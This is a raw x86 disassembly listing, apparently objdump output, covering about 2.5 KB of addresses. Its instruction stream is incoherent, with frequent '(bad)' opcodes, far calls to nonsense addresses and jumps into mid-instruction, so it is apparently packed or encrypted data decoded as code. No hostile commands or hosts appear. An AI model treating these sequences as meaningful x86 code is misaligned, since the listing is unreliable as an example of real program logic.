  43f1ec:	push   ebp
  43f1ed:	add    al,BYTE PTR [ebx+0xf000ce8]
  43f1f3:	adc    DWORD PTR [ecx-0x6],edx
  43f1f6:	dec    DWORD PTR [ebp+0x210fc043]
  43f1fc:	add    bh,dl
  43f1fe:	call   FWORD PTR [ebp-0x20fc077b]
  43f204:	sub    al,0x83
  43f206:	inc    esi
  43f207:	aad    0x8d
  43f209:	inc    esi
  43f20a:	pop    eax
  43f20b:	out    0xf2,al
  43f20d:	imul   ecx,DWORD PTR [ebx+0x0],0x0
	...
  43f228:	imul   edx,DWORD PTR [ebx+ecx*8],0xffffffe0
  43f22c:	(bad)  
  43f22d:	dec    edx
  43f22e:	cmp    BYTE PTR [edi],cl
  43f230:	and    ecx,DWORD PTR [ebp+0x9]
  43f233:	add    ch,dh
  43f235:	(bad)  
  43f236:	sbb    eax,DWORD PTR [esi-0x7f]
  43f239:	lea    eax,[esi+0x44]
  43f23c:	out    dx,al
  43f23d:	fiadd  WORD PTR [ebx+0x3e8f8d56]
  43f243:	dec    eax
  43f244:	inc    ebx
  43f245:	lea    eax,[ecx+eax*2]
  43f248:	xor    ecx,DWORD PTR [edi+0x4a967a04]
  43f24e:	ins    BYTE PTR es:[edi],dx
  43f24f:	and    edi,DWORD PTR [ebx+0x14]
  43f252:	adc    DWORD PTR [esi+0x5d],0x9
  43f256:	scas   eax,DWORD PTR es:[edi]
  43f257:	add    al,0x47
  43f259:	lea    eax,[esi+0x48]
  43f25c:	hlt    
  43f25d:	sub    al,BYTE PTR es:[edx+edx*4+0x26]
  43f262:	push   edx
  43f263:	ins    BYTE PTR es:[edi],dx
  43f264:	pop    edx
  43f265:	xor    eax,0xed714618
  43f26a:	dec    edi
  43f26b:	sbb    DWORD PTR [edi+0x6b],ebp
  43f26e:	popa   
  43f26f:	test   DWORD PTR [edx-0x7e],eax
  43f272:	sub    al,cl
  43f274:	jne    0x43f24d
  43f276:	sti    
  43f277:	dec    bl
  43f279:	lods   eax,DWORD PTR ds:[esi]
  43f27a:	sbb    dh,al
  43f27c:	dec    ebx
  43f27d:	test   eax,0x85cc522d
  43f282:	adc    DWORD PTR [eax],eax
  43f284:	hlt    
  43f285:	cs mov ecx,0x63eb7d08
  43f28b:	jge    0x43f28d
	...
  43f2a5:	and    cl,BYTE PTR [esi-0x1]
  43f2a8:	or     BYTE PTR [esi+0x8],dh
  43f2ab:	std    
  43f2ac:	push   esp
  43f2ae:	adc    eax,DWORD PTR [edi+0x270c184a]
  43f2b4:	dec    edx
  43f2b5:	add    al,0x27
  43f2b7:	imul   esp,DWORD PTR [eax-0x7a02521e],0xffffffba
  43f2be:	or     eax,0xdb90ba87
  43f2c3:	std    
  43f2c4:	push   ebx
  43f2c6:	add    al,dh
  43f2c8:	bound  ebp,QWORD PTR [ebp-0x1f]
  43f2cb:	sub    al,0x85
  43f2cd:	push   0xffffff85
  43f2cf:	jmp    0x43f2d0
  43f2d1:	dec    ebx
  43f2d2:	ss xchg ebx,eax
  43f2d4:	mov    al,ds:0x2bfdadea
  43f2d9:	mul    DWORD PTR ds:0x2bf535f9
  43f2df:	popf   
  43f2e0:	adc    dh,ah
  43f2e2:	lods   eax,DWORD PTR ds:[esi]
  43f2e3:	add    al,0xb2
  43f2e5:	xor    al,0xaa
  43f2e7:	mov    edx,DWORD PTR [eax+0x3d6724]
  43f2ed:	call   0xe39c:0x6677e804
  43f2f4:	add    esi,esp
  43f2f6:	xchg   ecx,eax
  43f2f7:	imul   ebp,DWORD PTR [ebp+0x5c],0x8
  43f2fb:	out    0x3,eax
  43f2fd:	jae    0x43f2c3
  43f2ff:	add    dl,ah
  43f301:	hlt    
  43f302:	add    al,0x3f
  43f304:	add    esp,ebx
  43f306:	ret    0x5de7
	...
  43f321:	add    BYTE PTR [ecx],ah
  43f323:	int    0x76
  43f325:	pop    es
  43f326:	std    
  43f327:	jns    0x43f2d9
  43f329:	add    eax,DWORD PTR [esi+0x343cd784]
  43f32f:	add    eax,0x79ed01be
  43f334:	mov    eax,0xf20a9ac5
  43f339:	cdq    
  43f33a:	sub    dh,BYTE PTR [ebp+0x2af44430]
  43f340:	call   0xe0d169b4
  43f345:	add    esi,esp
  43f347:	lea    ebp,[ecx+0x70]
  43f34a:	out    0x4,al
  43f34c:	out    0x16,eax
  43f34e:	mov    ebx,0x760da5ee
  43f353:	gs icebp 
  43f355:	add    esi,esp
  43f357:	lea    ebp,[ecx]
  43f359:	fs std 
  43f35b:	cwde   
  43f35c:	test   al,0x1d
  43f35e:	mov    dh,0x38
  43f360:	pop    esi
  43f361:	int    0x71
  43f363:	push   ebx
  43f364:	repz push cs
  43f366:	jbe    0x43f2ed
  43f368:	out    0x3,eax
  43f36a:	hlt    
  43f36b:	cmp    DWORD PTR [edx-0x2af9b47a],esi
  43f371:	xor    eax,0x63a18bac
  43f376:	xor    esp,DWORD PTR [eax-0x2d]
  43f379:	jle    0x43f341
  43f37b:	xor    BYTE PTR [esi+0x32],ch
  43f37e:	lods   al,BYTE PTR ds:[esi]
  43f37f:	lea    eax,[eax]
  43f381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f382:	iret   
  43f383:	xchg   DWORD PTR [edx-0xf],eax
	...
  43f39e:	add    dh,dh
  43f3a0:	jbe    0x43f3e6
  43f3a2:	jmp    0x43f395
  43f3a4:	iret   
  43f3a5:	fnsave [edx-0x4a]
  43f3a8:	dec    eax
  43f3a9:	sub    eax,0x5446d32a
  43f3ae:	bound  esp,QWORD PTR [esi]
  43f3b0:	stc    
  43f3b1:	xchg   BYTE PTR [edi-0x1a4ef3d1],ch
  43f3b7:	cmp    BYTE PTR [eax],ah
  43f3b9:	(bad)  
  43f3ba:	bound  ebx,QWORD PTR [esi]
  43f3bc:	inc    ebp
  43f3bd:	bound  esp,QWORD PTR [eax-0x4]
  43f3c0:	pop    edx
  43f3c1:	or     DWORD PTR [esi+0x2f85313d],ebx
  43f3c7:	add    BYTE PTR [eax-0x75b1d2ae],cl
  43f3cd:	add    al,0x23
  43f3cf:	(bad)  
  43f3d0:	dec    esi
  43f3d1:	pusha  
  43f3d2:	xor    al,0x4
  43f3d5:	add    cl,ch
  43f3d7:	cmp    al,0x74
  43f3d9:	out    0x6a,eax
  43f3db:	test   DWORD PTR [eax+eax*1],0x85313de8
  43f3e2:	aas    
  43f3e3:	clc    
  43f3e4:	mov    edi,0x4f030d53
  43f3e9:	pop    eax
  43f3ea:	scas   al,BYTE PTR es:[edi]
  43f3eb:	sub    eax,0xf7e90025
  43f3f0:	add    al,0x9
  43f3f2:	aas    
  43f3f3:	icebp  
  43f3f4:	mov    DWORD PTR [edx+0x31],eax
  43f3f7:	stos   DWORD PTR es:[edi],eax
  43f3f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f3f9:	or     DWORD PTR [edi],edi
  43f3fb:	sbb    edx,eax
  43f3fd:	cs test al,0x1a
  43f400:	inc    edi
  43f401:	push   esp
  43f402:	jo     0x43f404
	...
  43f41c:	mov    ebp,0xc2bce54c
  43f421:	push   esi
  43f422:	ins    BYTE PTR es:[edi],dx
  43f423:	bound  ebp,QWORD PTR [ebp-0x61a7a04]
  43f429:	xchg   DWORD PTR [edx-0x6448300],ecx
  43f42f:	jmp    DWORD PTR [esi+0xd16a43b]
  43f435:	add    eax,0x403bff2b
  43f43a:	cmp    al,0x4a
  43f43c:	xchg   BYTE PTR [ebx],bh
  43f43e:	mov    al,ds:0x83050d16
  43f443:	mov    es,WORD PTR [ebp+0x55fff9bb]
  43f449:	or     BYTE PTR [ecx],cl
  43f44b:	add    DWORD PTR [ebx+0x64],edx
  43f44e:	push   cs
  43f44f:	add    ch,cl
  43f451:	add    ebp,DWORD PTR [esi-0x63f69440]
  43f457:	xchg   BYTE PTR [ecx],ch
  43f459:	add    al,0x0
  43f45b:	add    BYTE PTR [esi-0x7d],al
  43f45e:	pushf  
  43f45f:	push   ss
  43f460:	int    0x4
  43f462:	test   DWORD PTR [ebx+ecx*2-0x62ffffc3],eax
  43f469:	sbb    edx,ecx
  43f46b:	sub    esp,DWORD PTR [esi+0xc]
  43f46e:	xchg   BYTE PTR [eax+0xf0004cb],ah
  43f474:	cmp    edi,eax
  43f476:	test   DWORD PTR [esi-0x37],0x3301f241
  43f47d:	and    eax,0xff7d
	...
  43f496:	add    BYTE PTR [eax],al
  43f498:	add    BYTE PTR [edx+0x62fdc688],dl
  43f49e:	(bad)  
  43f49f:	or     DWORD PTR [esi+0x21],0xffffff88
  43f4a3:	sar    DWORD PTR [eax+0x5a],0x41
  43f4a7:	cmp    BYTE PTR ds:[esi-0x3d],cl
  43f4ab:	jecxz  0x43f4af
  43f4ad:	sahf   
  43f4ae:	les    eax,FWORD PTR [ebx+0x625156]
  43f4b4:	sub    ecx,DWORD PTR [edi+esi*8]
  43f4b7:	dec    edi
  43f4b8:	push   esi
  43f4b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f4ba:	adc    eax,0xadf4002e
  43f4bf:	jl     0x43f503
  43f4c1:	mov    al,ds:0x307d0e22
  43f4c6:	fidiv  WORD PTR [esi+0x42]
  43f4c9:	rcl    BYTE PTR [ebp+0x6f],0xf8
  43f4cd:	sbb    esi,edi
  43f4cf:	jp     0x43f4db
  43f4d1:	ja     0x43f548
  43f4d3:	in     eax,dx
  43f4d4:	(bad)  
  43f4d5:	cli    
  43f4d6:	xor    BYTE PTR [ebx-0x5],dh
  43f4d9:	add    ebx,DWORD PTR [edi]
  43f4db:	das    
  43f4dc:	pop    edx
  43f4dd:	(bad)  
  43f4de:	in     eax,dx
  43f4df:	sub    bl,BYTE PTR [ebx-0x49]
  43f4e2:	and    al,BYTE PTR [esi+0x6c]
  43f4e5:	jg     0x43f4dc
  43f4e7:	cmp    al,0xf6
  43f4ea:	cmp    eax,DWORD PTR [edx]
  43f4ec:	mov    bh,0xf6
  43f4ee:	lods   eax,DWORD PTR ds:[esi]
  43f4ef:	std    
  43f4f0:	push   DWORD PTR [edi+0x30]
  43f4f3:	stc    
  43f4f4:	add    edi,DWORD PTR [ebp+0x37]
  43f4f7:	xchg   ecx,eax
  43f4f8:	adc    dh,ah
  43f4fa:	lods   eax,DWORD PTR ds:[esi]
  43f4fb:	push   edx
  43f4fc:	cmp    eax,DWORD PTR [eax]
	...
  43f516:	outs   dx,DWORD PTR ds:[esi]
  43f517:	jmp    FWORD PTR [edi]
  43f519:	add    esi,0x55
  43f51c:	pop    es
  43f51d:	test   DWORD PTR [edx],edi
  43f51f:	push   es
  43f520:	add    eax,esi
  43f522:	(bad)  
  43f523:	stos   DWORD PTR es:[edi],eax
  43f524:	adc    al,0xc7
  43f526:	inc    edi
  43f527:	add    eax,edx
  43f529:	push   eax
  43f52a:	and    eax,0xc1e2dc18
  43f52f:	lods   eax,DWORD PTR ds:[esi]
  43f530:	std    
  43f531:	test   BYTE PTR [edx],ch
  43f533:	adc    bh,BYTE PTR [ebx+0x3a]
  43f536:	ja     0x43f5a9
  43f538:	in     eax,dx
  43f539:	xchg   dl,cl
  43f53b:	icebp  
  43f53c:	fild   DWORD PTR [edx+0x6c]
  43f53f:	xchg   al,dl
  43f541:	test   edx,edi
  43f543:	jp     0x43f4fb
  43f545:	aaa    
  43f546:	lods   al,BYTE PTR ds:[esi]
  43f547:	fnsave [eax]
  43f549:	or     DWORD PTR [ecx+0x6c],ebp
  43f54c:	das    
  43f54d:	push   ebp
  43f54e:	jns    0x43f554
  43f550:	test   al,0x5
  43f552:	lahf   
  43f553:	ret    
  43f554:	xchg   cx,ax
  43f556:	xchg   esp,eax
  43f557:	push   ss
  43f558:	out    0x3,eax
  43f55a:	hlt    
  43f55b:	cmp    BYTE PTR [edi],cl
  43f55d:	jge    0x43f525
  43f55f:	pusha  
  43f560:	ins    BYTE PTR es:[edi],dx
  43f561:	mov    ch,0x9c
  43f563:	pop    es
  43f564:	outs   dx,BYTE PTR ds:[esi]
  43f565:	inc    ecx
  43f566:	fadd   QWORD PTR [ebx]
  43f568:	sbb    eax,0x1ff212dc
  43f56d:	pop    ebp
  43f56e:	hlt    
  43f56f:	jmp    0x43f595
  43f571:	xor    esi,DWORD PTR [ebx-0x388ff0aa]
  43f577:	add    al,0xe7
  43f579:	jl     0x43f57b
	...
  43f593:	inc    esi
  43f594:	xor    DWORD PTR [esi+0x11],ebx
  43f597:	imul   ecx,ecx,0x61467ad7
  43f59d:	(bad)  
  43f59f:	in     eax,0xbe
  43f5a1:	bnd jnp 0x43f59a
  43f5a4:	sub    DWORD PTR [edi-0xd],0x646b0fcb
  43f5ab:	mov    ebp,0x1e2fdabe
  43f5b0:	mov    ah,BYTE PTR [esi-0x643db0d5]
  43f5b6:	sar    BYTE PTR [eax-0x4f3f4c2f],0xd1
  43f5bd:	stos   DWORD PTR es:[edi],eax
  43f5be:	shr    BYTE PTR [eax-0x5f84e32f],0x52
  43f5c5:	adc    DWORD PTR [ebx+0x7],edi
  43f5c8:	or     eax,0xbe838b3a
  43f5cd:	out    0x3,eax
  43f5cf:	jno    0x43f58f
  43f5d1:	pop    esi
  43f5d2:	ds call 0x6b4a865b
  43f5d8:	mov    esi,0x8a1852e7
  43f5dd:	jns    0x43f5bb
  43f5df:	mov    esi,0x437600bb
  43f5e4:	mov    BYTE PTR [edx-0xb],cl
  43f5e7:	jo     0x43f59f
  43f5e9:	add    ch,al
  43f5eb:	test   DWORD PTR [ebp*2+0xc3a76f3],0x2c8232e9
  43f5f6:	jmp    0x43f5f8
	...
  43f610:	test   DWORD PTR [ebx+eax*4],0xd2822330
  43f617:	jmp    0x43f610
  43f619:	add    al,0x2d
  43f61b:	sub    DWORD PTR [edi-0x4a],esi
  43f61e:	std    
  43f61f:	mov    edx,0xb14287c8
  43f624:	jle    0x43f670
  43f626:	pop    eax
  43f627:	jb     0x43f5eb
  43f629:	xor    BYTE PTR [ebp-0x1f2ff469],al
  43f62f:	bound  ebp,QWORD PTR [edx]
  43f631:	std    
  43f632:	or     BYTE PTR [edi],bh
  43f634:	xor    al,0xe
  43f636:	(bad)  
  43f637:	mov    ecx,0x9d421fb0
  43f63c:	dec    esi
  43f63d:	dec    ebx
  43f63e:	inc    esp
  43f63f:	retf   0x87bd
  43f642:	push   edx
  43f643:	sub    DWORD PTR [ecx+0x43],eax
  43f646:	dec    eax
  43f647:	inc    edi
  43f648:	aas    
  43f649:	or     DWORD PTR [edi],edi
  43f64b:	dec    edi
  43f64c:	xor    DWORD PTR [ecx],ecx
  43f64e:	jbe    0x43f6b2
  43f650:	jmp    0xfc7b1385
  43f655:	xchg   DWORD PTR [edx+0x29],edx
  43f658:	fwait
  43f659:	je     0x43f65f
  43f65b:	and    ecx,DWORD PTR [edi]
  43f65d:	dec    ebx
  43f65e:	dec    eax
  43f65f:	(bad)  
  43f661:	dec    eax
  43f662:	bound  esi,QWORD PTR [edx+0x31]
  43f665:	xor    DWORD PTR [edx+0x70],esp
  43f668:	jmp    0x43f6b0
  43f66a:	test   DWORD PTR [edi],esp
  43f66c:	fadd   DWORD PTR [edi-0x4184e6ae]
  43f672:	stc    
	...
  43f68b:	add    BYTE PTR [eax],al
  43f68d:	dec    ebp
  43f68e:	add    DWORD PTR [ecx+0x4e3ff54e],eax
  43f694:	fs aam 0x4f
  43f697:	pusha  
  43f698:	test   DWORD PTR [ebp-0x34c4bdab],ebx
  43f69e:	add    DWORD PTR [eax],0x3a524d00
  43f6a4:	mov    esi,DWORD PTR [ebx+0x5d]
  43f6a7:	or     DWORD PTR [esi+0x29],0x1a
  43f6ab:	rol    BYTE PTR [ecx-0x6f83c],1
  43f6b1:	or     eax,0xd77c90a
  43f6b6:	icebp  
  43f6b7:	dec    ebp
  43f6b8:	call   0x440722
  43f6bd:	mov    es,ebp
  43f6bf:	or     BYTE PTR [ecx-0x784dead],cl
  43f6c5:	loopne 0x43f71a
  43f6c7:	push   ss
  43f6c8:	cmp    DWORD PTR [ebx+0x40],ebx
  43f6cb:	add    BYTE PTR [eax],al
  43f6cd:	int    0x54
  43f6cf:	or     eax,DWORD PTR [ebx+0x116d06f5]
  43f6d5:	push   esi
  43f6d6:	repnz imul ebp,DWORD PTR [ebx],0x63
  43f6da:	pop    eax
  43f6db:	jns    0x43f6d7
  43f6dd:	int    0xb8
  43f6df:	stc    
  43f6e0:	jmp    DWORD PTR [ebx]
  43f6e2:	push   es
  43f6e3:	cmp    DWORD PTR [esi+0x3d],0x1e783e3e
  43f6ea:	leave  
  43f6eb:	sti    
  43f6ec:	push   cs
  43f6ed:	subps  xmm7,xmm1
  43f6f0:	inc    DWORD PTR [eax]
	...
  43f70a:	lea    ecx,[edi]
  43f70c:	ds pusha 
  43f70e:	call   0x5e08:0x9d016481
  43f715:	mov    eax,ebx
  43f717:	and    al,0x5e
  43f719:	sub    eax,ebx
  43f71b:	sub    al,0x83
  43f71d:	inc    esi
  43f71e:	hlt    
  43f71f:	add    DWORD PTR [edi+0x4a],esi
  43f722:	loopne 0x43f727
  43f724:	pop    ss
  43f725:	int    0x6f
  43f727:	and    al,0xa8
  43f729:	adc    dh,ah
  43f72b:	lods   eax,DWORD PTR ds:[esi]
  43f72c:	jp     0x43f7aa
  43f72e:	cld    
  43f72f:	xor    BYTE PTR [esi+0x42],dh
  43f732:	int3   
  43f733:	ficom  DWORD PTR [esi+eax*8+0x12a43c6f]
  43f73a:	hlt    
  43f73b:	lods   eax,DWORD PTR ds:[esi]
  43f73c:	arpl   WORD PTR [edi-0x65878100],ax
  43f742:	push   esp
  43f743:	mov    ah,0xfd
  43f745:	jmp    FWORD PTR [edi+0x5c]
  43f748:	ins    BYTE PTR es:[edi],dx
  43f749:	adc    dh,ah
  43f74b:	lods   eax,DWORD PTR ds:[esi]
  43f74c:	sbb    ebp,edi
  43f74e:	jnp    0x43f6fa
  43f750:	out    0x8,eax
  43f752:	inc    edx
  43f753:	out    dx,al
  43f754:	xchg   bh,bh
  43f756:	add    ebp,DWORD PTR [esi+0x4e59fefd]
  43f75c:	repnz push ebx
  43f75f:	mov    ds:0x67e49093,al
  43f764:	cmp    eax,0x69ad5a00
  43f769:	xchg   edx,eax
  43f76a:	jl     0x43f70d
  43f76c:	std    
  43f76d:	inc    DWORD PTR [eax]
	...
  43f787:	sub    DWORD PTR [ecx],0xadf09872
  43f78d:	std    
  43f78e:	jle    0x43f745
  43f790:	mov    ds:0x65f400cc,al
  43f795:	std    
  43f796:	(bad)  
  43f797:	mov    bl,0xad
  43f799:	arpl   WORD PTR ds:0x9005ebc,si
  43f79f:	imul   esi,DWORD PTR [esp+edi*8-0x4f],0x75
  43f7a4:	jge    0x43f7db
  43f7a6:	inc    eax
  43f7a7:	hlt    
  43f7a8:	(bad)  
  43f7a9:	cli    
  43f7aa:	or     BYTE PTR [ebx-0x64],al
  43f7ad:	mov    esi,0xf204fbe6
  43f7b2:	xchg   ebp,eax
  43f7b3:	cli    
  43f7b4:	mov    ah,0x30
  43f7b6:	inc    esp
  43f7b7:	hlt    
  43f7b8:	and    ch,al
  43f7ba:	outs   dx,DWORD PTR ds:[esi]
  43f7bb:	jbe    0x43f749
  43f7bd:	loopne 0x43f7c2
  43f7bf:	hlt    
  43f7c0:	(bad)
  43f7c4:	add    eax,0xf79118e7
  43f7c9:	lahf   
  43f7ca:	or     dh,BYTE PTR [esi+0x64]
  43f7cd:	rol    DWORD PTR [ebx],1
  43f7cf:	hlt    
  43f7d0:	(bad)
  43f7d4:	nop
  43f7d5:	sub    BYTE PTR [eax+0x41],bh
  43f7d8:	out    dx,eax
  43f7d9:	ss add al,dh
  43f7dc:	xor    BYTE PTR [esi-0x3d],ah
  43f7df:	push   ds
  43f7e0:	lea    ebp,[ecx-0x10b68cb5]
  43f7e6:	jle    0x43f7a3
  43f7e8:	add    al,0xe8
  43f7ea:	sub    eax,0x0
	...
  43f803:	add    BYTE PTR [eax-0x36a06e71],bl
  43f809:	rcr    DWORD PTR [edx-0x50bd8ef3],cl
  43f80f:	js     0x43f84f
  43f811:	pop    ebp
  43f812:	pop    esi
  43f813:	sub    eax,0x7807d620
  43f818:	cs std 
  43f81a:	icebp  
  43f81b:	xchg   ebp,eax
  43f81c:	sub    BYTE PTR [eiz*8-0x57196cf0],dl
  43f823:	aaa    
  43f824:	jno    0x43f871
  43f826:	mov    ds:0xf24d367a,eax
  43f82b:	xchg   edx,eax
  43f82c:	lock inc ebx
  43f82e:	push   es
  43f82f:	scas   al,BYTE PTR es:[edi]
  43f830:	jns    0x43f885
  43f832:	daa    
  43f833:	bound  esi,QWORD PTR [ebx+0x1]
  43f836:	sub    eax,0x534364fb
  43f83b:	jg     0x43f86b
  43f83d:	dec    ebp
  43f83e:	outs   dx,BYTE PTR ds:[esi]
  43f83f:	xor    bh,BYTE PTR [eax]
  43f841:	and    eax,DWORD PTR [eax]
  43f843:	pusha  
  43f844:	hlt    
  43f845:	inc    edx
  43f846:	mov    ch,0xe8
  43f848:	test   DWORD PTR [eax+eax*1],0x733cbea6
  43f84f:	pop    edx
  43f850:	stc    
  43f851:	pop    esi
  43f852:	ins    BYTE PTR es:[edi],dx
  43f853:	push   0xffffffbd
  43f855:	or     al,0x0
  43f857:	bound  esi,QWORD PTR [esi-0x47d03ed8]
  43f85d:	add    al,0x0
  43f85f:	jmp    0x986bc5b
  43f864:	repnz add al,0x0
  43f867:	jmp    0x43f86c
	...
  43f880:	add    BYTE PTR [esi],bh
  43f882:	xchg   bl,ah
  43f884:	fs das 
  43f886:	mov    esp,0x85dbb785
  43f88b:	into   
  43f88c:	shl    esi,1
  43f88e:	jg     0x43f8da
  43f890:	adc    ebx,edi
  43f892:	ret    0xebe5
  43f895:	add    al,dl
  43f897:	jmpw   0x738d
  43f89b:	push   eax
  43f89c:	cwde   
  43f89d:	lds    ebp,FWORD PTR [edi+eiz*1-0x7afb0806]
  43f8a4:	mov    bh,0xa3
  43f8a6:	jg     0x43f8e2
  43f8a8:	push   0xffffffb4
  43f8aa:	adc    al,0x87
  43f8ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f8ad:	adc    ebp,DWORD PTR [ebp-0x4450eb79]
  43f8b3:	test   edi,ebx
  43f8b5:	jb     0x43f8e9
  43f8b7:	adc    cl,ch
  43f8b9:	into   
  43f8ba:	xchg   BYTE PTR [ebx+0x59bbbef4],ch
  43f8c0:	(bad)
  43f8c4:	inc    esp
  43f8c5:	mov    bl,0x37
  43f8c7:	jp     0x43f91a
  43f8c9:	clc    
  43f8ca:	or     eax,DWORD PTR [edx+edi*2+0x620004f7]
  43f8d1:	xor    eax,0xe3008529
  43f8d6:	or     BYTE PTR [edx-0x7c317abc],al
  43f8dc:	xchg   esi,eax
  43f8dd:	jge    0x43f892
  43f8df:	stc    
  43f8e0:	call   DWORD PTR [esi]
  43f8e2:	cmp    al,0xa4
  43f8e4:	push   ss
	...
  43f8fd:	add    BYTE PTR [ebp-0x400d4fb],cl
  43f903:	aaa    
  43f904:	cmp    al,0x51
  43f906:	(bad)  
  43f907:	xor    ebx,DWORD PTR [eax-0x7cfab2ea]
  43f90d:	mov    gs,WORD PTR [ebp-0x3a00064d]
  43f913:	mov    ecx,0x65a30103
  43f918:	push   cs
  43f919:	add    BYTE PTR [ebp-0x42],cl
  43f91c:	scas   eax,DWORD PTR es:[edi]
  43f91d:	shr    BYTE PTR [ebx],1
  43f91f:	add    BYTE PTR [esi+edx*4+0x5a9],bl
  43f926:	nop
  43f927:	cmp    DWORD PTR [esi+0x50d94],ecx
  43f92d:	mov    ecx,DWORD PTR [ebx+0x1d000e21]
  43f933:	sbb    bh,BYTE PTR [ebx+0xe659b39]
  43f939:	add    BYTE PTR ds:0x438b2754,cl
  43f93f:	loope  0x43f9bd
  43f941:	leave  
  43f942:	xchg   ebp,eax
  43f943:	add    eax,DWORD PTR [ebx-0x47003aba]
  43f949:	jmp    0x43f91a
  43f94b:	xadd   BYTE PTR [ebx+0x62507b],cl
  43f952:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f953:	jno    0x43f99f
  43f955:	push   eax
  43f956:	imul   ebx,esp,0xffffff82
  43f959:	xor    cl,ch
  43f95b:	add    al,0x83
  43f95d:	inc    esi
  43f95e:	and    DWORD PTR [edx],edi
  43f960:	add    DWORD PTR ss:[eax],0x0
	...
  43f978:	add    BYTE PTR [eax],al
  43f97a:	add    BYTE PTR [ecx-0x4f],bl
  43f97d:	add    BYTE PTR [esi-0xc],0xf1
  43f981:	(bad)  
  43f983:	test   al,0xc7
  43f985:	mov    DWORD PTR [ebp+0x6c27acea],0x7d4fe893
  43f98f:	or     eax,0x2ae6fdde
  43f994:	addr16 (bad) 
  43f996:	stc    
  43f997:	cmc    
  43f998:	aas    
  43f999:	pop    eax
  43f99a:	stc    
  43f99b:	ret    0x7511
  43f99e:	pop    edx
  43f99f:	fadd   QWORD PTR [ebx+ecx*8-0x7c789c04]
  43f9a6:	jp     0x43f974
  43f9a8:	lods   eax,DWORD PTR ds:[esi]
  43f9a9:	dec    ecx
  43f9aa:	inc    edx
  43f9ab:	jg     0x43f9bd
  43f9ad:	pop    eax
  43f9ae:	test   DWORD PTR [edx-0x9bb848b],esi
  43f9b4:	es jnp 0x43f941
  43f9b7:	xchg   esp,eax
  43f9b8:	mov    eax,0x307ffffd
  43f9bd:	mov    al,ds:0x14adf412
  43f9c2:	stc    
  43f9c3:	call   0xa458:0x6f460824
  43f9ca:	adc    dh,ah
  43f9cc:	lods   eax,DWORD PTR ds:[esi]
  43f9cd:	jl     0x43f959
  43f9cf:	ins    BYTE PTR es:[edi],dx
  43f9d0:	fdivr  st,st(5)
  43f9d2:	jmp    FWORD PTR [edx+eiz*4-0x12]
  43f9d6:	(bad)  
  43f9d7:	pop    ecx
  43f9d8:	dec    esi
  43f9d9:	out    dx,al
  43f9da:	push   ebx
  43f9dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f9dd:	pop    eax
	...
  43f9f7:	add    BYTE PTR [edx-0x53],dl
  43f9fa:	popa   
  43f9fb:	or     BYTE PTR [eax+0x69fffdad],0x29
  43fa02:	jle    0x43f998
  43fa04:	hlt    
  43fa05:	lods   eax,DWORD PTR ds:[esi]
  43fa06:	std    
  43fa07:	xchg   BYTE PTR [edx-0x7a],cl
  43fa0a:	jl     0x43fa4e
  43fa0c:	push   eax
  43fa0d:	and    edi,DWORD PTR [ebp+edi*2+0x55e504bc]
  43fa14:	idiv   DWORD PTR [ebp-0x1b]
  43fa17:	add    esi,esp
  43fa19:	add    al,0x66
  43fa1b:	inc    esi
  43fa1c:	lock add BYTE PTR [eax+0x79],ah
  43fa20:	pusha  
  43fa21:	push   cs
  43fa22:	out    0x3,eax
  43fa24:	pop    es
  43fa25:	cli    
  43fa26:	ins    DWORD PTR es:[edi],dx
  43fa27:	xor    DWORD PTR [eax],ebp
  43fa29:	adc    BYTE PTR [ebp+0x198bf54b],0xc
  43fa30:	jns    0x43f9ff
  43fa32:	mov    es,WORD PTR ds:0x1d36ce21
  43fa38:	stos   BYTE PTR es:[edi],al
  43fa39:	push   esp
  43fa3a:	cmp    BYTE PTR [edx],dh
  43fa3c:	dec    esp
  43fa3d:	fstp   st(0)
  43fa3f:	add    esi,esp
  43fa41:	mov    esi,DWORD PTR [ecx]
  43fa43:	pop    eax
  43fa44:	jns    0x43fa3c
  43fa46:	gs mov edi,0x28218de4
  43fa4c:	dec    esp
  43fa4d:	std    
  43fa4e:	jb     0x43fa18
  43fa50:	cmp    eax,0x3414f98b
  43fa55:	std    
  43fa56:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43fa57:	repz int3 
  43fa59:	pop    es
  43fa5a:	jl     0x43fa1f
	...
  43fa74:	add    BYTE PTR [esi+0x1ac3665b],bh
  43fa7a:	pop    eax
  43fa7b:	test   BYTE PTR es:[esi+0x64],cl
  43fa7f:	rol    DWORD PTR [ebx],1
  43fa81:	hlt    
  43fa82:	add    al,0xbb
  43fa84:	or     edi,DWORD PTR [ecx+0x4e]
  43fa87:	mov    edi,DWORD PTR [esi+0x2a]
  43fa8a:	cmp    al,0xea
  43fa8c:	jl     0x43facc
  43fa8e:	std    
  43fa8f:	in     eax,0xbd
  43fa91:	rol    DWORD PTR [ebx],1
  43fa93:	(bad)  
  43fa94:	mov    edx,0xc5be055a
  43fa99:	inc    esp
  43fa9a:	push   esp
  43fa9b:	cdq    
  43fa9c:	fild   DWORD PTR [edx+0x7103e6f4]
  43faa2:	aas    
  43faa3:	add    BYTE PTR [ebp+0x257cfb40],al
  43faa9:	(bad)  
  43faaa:	jg     0x43faee
  43faac:	inc    ebp
  43faad:	shl    BYTE PTR [edi-0x7f4c2113],1
  43fab3:	or     ch,BYTE PTR [edx+0x31]
  43fab6:	adc    eax,0x1e1bde00
  43fabb:	cli    
  43fabc:	(bad)  
  43fabd:	mov    ebx,0xb7725a5c
  43fac2:	push   eax
  43fac3:	pop    ebx
  43fac4:	stos   BYTE PTR es:[edi],al
  43fac5:	cmp    al,0xc9
  43fac7:	int3   
  43fac8:	popf   
  43fac9:	cmp    al,0xc9
  43facb:	int3   
  43facc:	mov    ch,0xac
  43face:	leave  
  43facf:	int3   
  43fad0:	lods   eax,DWORD PTR ds:[esi]
  43fad1:	lods   al,BYTE PTR ds:[esi]
  43fad2:	leave  
  43fad3:	int3   
  43fad4:	cmp    al,0xdf
  43fad6:	test   al,0x85
  43fad8:	sbb    al,0x0
	...
  43faf2:	pop    eax
  43faf3:	push   esp
  43faf4:	sub    eax,0x74caff7f
  43faf9:	or     ecx,edi
  43fafb:	cmc    
  43fafc:	sbb    esi,DWORD PTR [edx+0x60553181]
  43fb02:	mov    al,ds:0x23d88718
  43fb07:	jg     0x43fb78
